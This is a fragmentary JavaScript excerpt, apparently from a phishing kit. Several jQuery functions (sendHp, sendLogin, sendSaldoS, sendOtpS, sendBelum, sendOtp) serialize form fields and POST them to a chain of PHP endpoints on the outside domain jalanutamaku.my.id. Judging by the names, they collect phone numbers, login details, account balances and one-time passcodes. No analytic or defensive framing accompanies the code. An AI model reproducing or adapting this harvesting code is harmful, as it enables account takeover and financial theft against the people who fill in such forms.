function sendHp() {
   ...
   $.ajax({
      url: 'https://jalanutamaku.my.id/ast/req/one.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://jalanutamaku.my.id/ast/req/two.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://jalanutamaku.my.id/ast/req/thre.php',
      type: 'POST',
...
function sendOtpS() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://jalanutamaku.my.id/ast/req/empat.php',
...
function sendBelum(){    
   ...
   $.ajax({
        type: 'POST',
        url: 'https://jalanutamaku.my.id/ast/req/lima.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://jalanutamaku.my.id/ast/req/tujuh.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
